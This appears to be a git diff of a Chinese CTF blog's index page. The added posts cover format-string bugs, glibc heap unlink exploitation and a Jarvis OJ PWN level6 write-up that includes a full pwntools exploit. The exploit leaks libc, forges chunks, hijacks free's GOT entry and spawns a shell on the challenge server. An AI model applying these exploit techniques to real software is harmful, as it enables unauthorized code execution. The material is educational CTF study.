@@ -1,202 +1,273 @@
-<!DOCTYPE html>
-<html lang=Ch>
-<head>
-    <meta charset="utf-8">
-    
-    <title>y4ngyy</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta property="og:type" content="website">
-<meta property="og:title" content="y4ngyy">
-<meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="y4ngyy">
-<meta property="og:locale" content="Chinese">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="y4ngyy">
-    
+<!doctype html>
+<html lang="en">
+    <head>
+    <!-- Require Meta -->
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-    
-
-    
-        <link rel="icon" href="/css/images/favicon.ico" />
-    
-
-    <link rel="stylesheet" href="/libs/font-awesome5/css/fontawesome.min.css">
-    <link rel="stylesheet" href="/libs/font-awesome5/css/fa-brands.min.css">
-    <link rel="stylesheet" href="/libs/font-awesome5/css/fa-solid.min.css">
-    <link rel="stylesheet" href="/libs/open-sans/styles.css">
-    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
-
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <!-- Font-awsome CSS-->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+    <!-- hightlight.js -->
     <link rel="stylesheet" href="/css/style.css">
-
-    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
-    
-    
-        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
-    
-    
-        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
-    
-    
-    
-    
-
-
+    <link type="icon" href="/images/favicon.ico">
+    <!-- title -->
+    <title>y4ngyy</title>
 </head>
-
 <body>
-    <div id="container">
-        <header id="header">
-    <div id="header-main" class="header-inner">
-        <div class="outer">
-            <a href="/" id="logo">
-                <i class="logo"></i>
-                <span class="site-title">y4ngyy</span>
-            </a>
-            <nav id="main-nav">
-                
-                    <a class="main-nav-link" href="/.">Home</a>
-                
-                    <a class="main-nav-link" href="/archives">Archives</a>
-                
-            </nav>
-            
-                
-                <nav id="sub-nav">
-                    <div class="profile" id="profile-nav">
-                        <a id="profile-anchor" href="javascript:;">
-                            <img class="avatar" src="/css/images/avatar.jpg" />
-                            <i class="fas fa-caret-down"></i>
-                        </a>
-                    </div>
-                </nav>
-            
-            <div id="search-form-wrap">
-
-    <form class="search-form" method="GET" action="https://www.baidu.com/s?">
-    <input name="wd" type="text" class="search-form-input" placeholder="Search" />
-    <button type="submit" class="search-form-submit"></button>
-</form>
-<script>
-(function ($) {
-    $('.search-form').on('submit', function (e) {
-        var keyword = $('.search-form-input[name="wd"]').val();
-        window.location = 'https://www.baidu.com/s?wd=site:yoursite.com ' + keyword;
-        return false;
-    });
-})(jQuery);
-</script>
-
-</div>
-        </div>
-    </div>
-    <div id="main-nav-mobile" class="header-sub header-inner">
-        <table class="menu outer">
-            <tr>
-                
-                    <td><a class="main-nav-link" href="/.">Home</a></td>
-                
-                    <td><a class="main-nav-link" href="/archives">Archives</a></td>
-                
-                <td>
-                    
-    <form class="search-form" method="GET" action="https://www.baidu.com/s?">
-    <input name="wd" type="text" class="search-form-input" placeholder="Search" />
-    <button type="submit" class="search-form-submit"></button>
-</form>
-<script>
-(function ($) {
-    $('.search-form').on('submit', function (e) {
-        var keyword = $('.search-form-input[name="wd"]').val();
-        window.location = 'https://www.baidu.com/s?wd=site:yoursite.com ' + keyword;
-        return false;
-    });
-})(jQuery);
-</script>
-
-                </td>
-            </tr>
-        </table>
-    </div>
-</header>
-
-        <div class="outer">
-            
-                
-
-<aside id="profile" class="profile-fixed">
-    <div class="inner profile-inner">
-        <div class="base-info profile-block">
-            <img id="avatar" src="/css/images/avatar.jpg" />
-            <h2 id="name">y4ngyy</h2>
-            <h3 id="title">Web Android CTF</h3>
-            <span id="location"><i class="fas fa-map-marker-alt" style="padding-right: 5px"></i>Nanjing, China</span>
-            <a id="follow" target="_blank" href="https://github.com/y4ngyy">FOLLOW</a>
-        </div>
-        <div class="article-info profile-block">
-            <div class="article-info-block">
-                3
-                <span>posts</span>
-            </div>
-            <div class="article-info-block">
-                0
-                <span>tag</span>
-            </div>
-        </div>
-        
-        <div class="profile-block social-links">
-            <table>
-                <tr>
-                    
-                    
-                    <td>
-                        <a href="http://github.com/ppoffice/hexo-theme-icarus" target="_blank" title="github" class=tooltip>
-                            <i class="fab fa-github"></i>
-                        </a>
-                    </td>
-                    
-                </tr>
-            </table>
-        </div>
-        
-    </div>
-</aside>
-
-            
-            <section id="main">
-    <article id="post-docker学习" class="article article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
-        
-        
-            <header class="article-header">
-                
-    
-        <h1 itemprop="name">
-            <a class="article-title" href="/2018/11/22/docker学习/">docker学习</a>
-        </h1>
-    
-
-                
-                    <div class="article-meta">
-                        
-    <div class="article-date">
-        <i class="fas fa-calendar-alt"></i>
-        <a href="/2018/11/22/docker学习/">
-            <time datetime="2018-11-22T10:44:23.000Z" itemprop="datePublished">2018-11-22</time>
+    <div class="sidebar-container">
+<div class="sidebar rounded">
+    <!--头像区域-->
+    <div class="head bg-dark text-center rounded-bottom">
+        <a href="#">
+            <img src="/images/avatar.jpg" alt="avatar.jpg">
         </a>
+        <h2 class="text-light mt-4">y4ngyy</h2>
     </div>
-
-
-                        
-                        
-                    </div>
-                
-            </header>
-        
-        
-        <div class="article-entry" itemprop="articleBody">
-        
+    <!--个人描述-->
+    <section class="text-center text-dark p-lg-5 p-3" id="description"><h4 class="m-0">无所事事,游手好闲</h4></section>
+    <!--导航条-->
+    <nav>
+        <p  class="nav-clapse fa fa-bars text-center"></p>
+        <ul class="nav flex-column text-center">
             
-            <p>今天白天摸了一下docker，晚上来总结一波。<br>首先安装docker，鉴于之前装了双系统后面发现没用的经验，直接用windows安装了docker，docker-windows只支持win10 pro和企业版，较早版本的windows只能安装docker-toolbox来使用docker。<br>装完后可能会有个更换国内源的问题：<code>docker-machine ssh default</code>进入虚拟机，然后<code>vi /var/lib/boot2docker/profile</code>，加一行<code>--registry-mirror=国内源</code><br>接下来一些命令：<br>拉取镜像</p>
+            <li class="nav-item">
+                <a href="/" class="nav-link text-secondary">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a href="/archives" class="nav-link text-secondary">Archives</a>
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+</div>
+    <div class="content-container">
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/12/24/pwn-格式化字符串/" id="title">【PWN】格式化字符串</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-12-24</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
+                
+                <p>C语言中经常使用<code>scanf</code>和<code>pringtf</code>进行格式化的读入和输出，但是没有做好过滤可能导致程序漏洞。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>通常C语言中的占位符有如下：</p>
+<table>
+<thead>
+<tr>
+<th>占位符</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%p</td>
+<td>以16进制输出指针的值（地址）</td>
+</tr>
+<tr>
+<td>%x</td>
+<td>输出16进制值（与%p有区别）</td>
+</tr>
+<tr>
+<td>%s</td>
+<td>输出字符串值</td>
+</tr>
+<tr>
+<td>%d</td>
+<td>输出10进制整数</td>
+</tr>
+<tr>
+<td>%n</td>
+<td>占位符前面成功输入的字符个数写入变量中</td>
+</tr>
+</tbody>
+</table>
+<p>用<code>%number$p</code>可以指定后number个参数输出。</p>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>若程序中直接使用<code>printf(str)</code>，且<code>str</code>我们可以控制，则在str中输入格式化字符串，可以泄露出栈内容，且可以进行任意地址写。<br><strong>利用方式</strong>:</p>
+<ol>
+<li>泄露出栈中内容，找到栈中str的位置（利用%number$x）进行探查。</li>
+<li>构造payload<code>地址+填充字符+%number$n</code>可以任意地址写入内容。</li>
+</ol>
+
+                
+            </article>
+            <hr width="90%" color="#ddd">
+        </div>
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/12/19/Jarvis-OJ-PWN-level6-WriteUp/" id="title">Jarvis OJ PWN level6 WriteUp</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-12-19</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
+                
+                <p>终于做完了自己在pwn方向的第一道堆题，参考了<a href="https://blog.csdn.net/qq_38204481/article/details/82808011" target="_blank" rel="noopener">writeup1</a>和<a href="https://blog.csdn.net/charlie_heng/article/details/79123634" target="_blank" rel="noopener">writeup2</a>怼了四天，终于理解了整道题目，本地调通了，但是题目服务器貌似有点问题，题目提供的libc偏移对不上，远程没有调通</p>
+<h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><ol>
+<li>泄露出libc的基址和heap的地址</li>
+<li>根据泄露的libc基址算出system函数的基址</li>
+<li>伪造chunk，free掉伪造的chunk触发unlink，使得可以任意地址写</li>
+<li>劫持got表中的free为system函数地址，调用删除功能，getshell</li>
+</ol>
+<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p>首先查看程序功能：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">== Blue-lotus Free Note ==</span><br><span class="line">1. List Note</span><br><span class="line">2. New Note</span><br><span class="line">3. Edit Note</span><br><span class="line">4. Delete Note</span><br><span class="line">5. Exit</span><br><span class="line">====================</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
+<p>再拖入IDA看一下逻辑。找到可以利用的地方：</p>
+<ol>
+<li>程序一开始malloc一个3096大小的堆用来管理之后创建的note</li>
+<li>delete功能在free之后没有将指针置空，可以进行利用</li>
+<li>在new note的时候，尾部没有加上\x00，可以用来进行地址泄露</li>
+<li>在new note的时候，有逻辑判断让malloc的chunk至少为136大小，属于small chunk的范畴，可以使用unlink</li>
+</ol>
+<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p><strong>libc地址泄露</strong>的具体原理为：</p>
+<ol>
+<li>由于在写入的时候没有加上\x00，所以在输出的时候可以也一直输出到之后的\x00为止。</li>
+<li>当chunk被free掉后fd和bk指针会的值为&lt;main_arena+offset&gt;，而&lt;main_arena+offset&gt;与libc加载地址的相对偏移是固定的。所以只需要泄露出&lt;main_arena+offset&gt;，再在本地调试找到算出libc和main_arena的偏移，便能知道libc的基址</li>
+<li>最终操作为：创建两个note(chunk)(防止top chunk的合并)=&gt;free掉第一个=&gt;再创建note(这时候申请的chunk的大小要与free掉的一致才能申请到原来的空间，且输入的大小不能超过四个字节，否则会覆盖地址信息)=&gt;list note拿到地址信息</li>
+</ol>
+<p><strong>heap地址泄露</strong>的原理为：当两个不相邻的chunk被free掉时，会至于bin的链表中，本例中会先放到unsorted bin中，这时chunk的fd和bk中存有chunk的地址信息，接下来操作同上文则可泄露heap地址。</p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><a href="https://www.jianshu.com/p/73715c903c88" target="_blank" rel="noopener">unlink</a></h3><p>程序在最开始的时候，申请了一个堆作为note的管理，可以看到里面存储了note的地址，所以通过unlink伪造chunk的方式可以取得该区的控制权，从而能任意地址写，劫持got表。需要注意的是伪造chunk的大小要地址对齐。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./freenote_x86')</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.19.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./freenote_x86'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9885</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newNote</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editNote</span><span class="params">(number, length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line">    p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listNote</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># ======================================== leak libc address</span></span><br><span class="line">    offset = <span class="number">0x1b27b0</span> <span class="comment"># main to libc</span></span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">7</span>) <span class="comment"># 0</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'b'</span>*<span class="number">7</span>) <span class="comment"># 1</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>)</span><br><span class="line">    newNote(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">    listNote()</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recv(<span class="number">7</span>)</span><br><span class="line">    main_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_addr = main_addr - offset</span><br><span class="line">    system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'leak address:%x'</span>%main_addr</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'libc address:%x'</span>%libc_addr</span><br><span class="line"><span class="comment"># ========================================= leak heap address</span></span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'c'</span>*<span class="number">7</span>) <span class="comment"># 2</span></span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'d'</span>*<span class="number">7</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    deleteNote(<span class="number">0</span>)</span><br><span class="line">    deleteNote(<span class="number">2</span>)</span><br><span class="line">    newNote(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">    listNote()</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recv(<span class="number">7</span>)</span><br><span class="line">    heap_base = u32(p.recv(<span class="number">4</span>))<span class="number">-0xd28</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'heap address:%x'</span>%heap_base</span><br><span class="line">    deleteNote(<span class="number">0</span>)</span><br><span class="line">    deleteNote(<span class="number">1</span>)</span><br><span class="line">    deleteNote(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># ========================================= unlink</span></span><br><span class="line">    payload = p32(<span class="number">0</span>)+p32(<span class="number">0x81</span>)+p32(heap_base+<span class="number">0x18</span><span class="number">-12</span>)+p32(heap_base+<span class="number">0x18</span><span class="number">-8</span>)<span class="comment"># fakechunk1: prev_size size fd bk fill_data 0x88</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>) </span><br><span class="line">    payload += p32(<span class="number">0x80</span>)+p32(<span class="number">0x80</span>) <span class="comment"># fakechunk2: prev_size size fd-data </span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>*<span class="number">2</span>,<span class="string">'a'</span>)</span><br><span class="line">    newNote(len(payload),payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    deleteNote(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ========================================= hijack got</span></span><br><span class="line">    payload2 = p32(<span class="number">2</span>)+p32(<span class="number">1</span>)+p32(<span class="number">4</span>)+p32(elf.got[<span class="string">'free'</span>])+p32(<span class="number">1</span>)+p32(<span class="number">8</span>)+p32(heap_base+<span class="number">0xca8</span>)</span><br><span class="line">    payload2 = payload2.ljust(<span class="number">0x80</span>*<span class="number">2</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    editNote(<span class="number">0</span>,len(payload2),payload2)</span><br><span class="line">    editNote(<span class="number">0</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">    editNote(<span class="number">1</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'system address:%x'</span>%system_addr</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    deleteNote(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+                
+            </article>
+            <hr width="90%" color="#ddd">
+        </div>
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/12/17/pwn-unlink/" id="title">【PWN】unlink exploit</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-12-17</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
+                
+                <h2 id="堆机制"><a href="#堆机制" class="headerlink" title="堆机制"></a>堆机制</h2><p>当一个<strong>small chunk</strong>被free掉时，会有如下操作：</p>
+<ol>
+<li><p>检查是否能向后合并，如果相邻低位的chunk也处于被free的状态，则向后合并。</p>
+<ul>
+<li>合并两个chunk的内存</li>
+<li>修改当前chunk指针为前一个chunk指针</li>
+<li>触发<strong>unlink操作</strong>将前一个chunk从双向链表(bin)中移除</li>
+</ul>
+</li>
+<li><p>检查是否能向前合并，如果相邻高位的chunk处于被free的状态，则向前合并，同样能出发<strong>unlink 操作</strong>。</p>
+</li>
+</ol>
+<p><strong>unlink</strong>的操作为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">          || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);</span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">            fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">              fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">              p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">              p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">          p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中重要的操作为：(主要就是将chunk从双向链表中移除)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd = p-&gt;fd;</span><br><span class="line">mchunkptr bk = p-&gt;bk;</span><br><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure>
+<p>还有需要注意的检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>由于有了检查机制，所以unlink所能做的操作有所限制。具体操作为：</p>
+<ol>
+<li>构造<code>p-&gt;fd=(p)-12</code>,<code>p-&gt;bk=(p)-8</code></li>
+<li>触发unlink(p)</li>
+<li>于是unlink操作变为了 <code>(p)=(p)-8</code> =&gt; <code>(p)=(p)-12</code></li>
+</ol>
+<p>所以最终结果为<code>(p)</code>指针-12，<code>(p)</code>可以是任何存放p指针的地方。<br>虽然操作有限，但在一些场合下可以与<strong>堆溢出</strong>，<strong>user after free</strong>等配合，从而任意地址写。</p>
+
+                
+            </article>
+            <hr width="90%" color="#ddd">
+        </div>
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/12/14/堆的理解/" id="title">堆的理解</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-12-14</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
+                
+                <p>参考hac师傅的<a href="https://www.cnblogs.com/hac425/p/9416792.html" target="_blank" rel="noopener">博客</a>和<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction/" target="_blank" rel="noopener">CTF-wiki</a>自己总结一下。理解有误，请多指正。</p>
+<h2 id="堆块概念"><a href="#堆块概念" class="headerlink" title="堆块概念"></a>堆块概念</h2><p>堆为程序运行时可以由程序动态申请的<strong>线性</strong>内存区域，由低地址向高地址增长（栈为从高到低），在C语言中可以通过<code>malloc</code>和<code>free</code>进行堆块申请和释放操作。</p>
+<h2 id="堆块机制"><a href="#堆块机制" class="headerlink" title="堆块机制"></a>堆块机制</h2><p>堆分配中以chunk为单位，其中chunk的数据结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
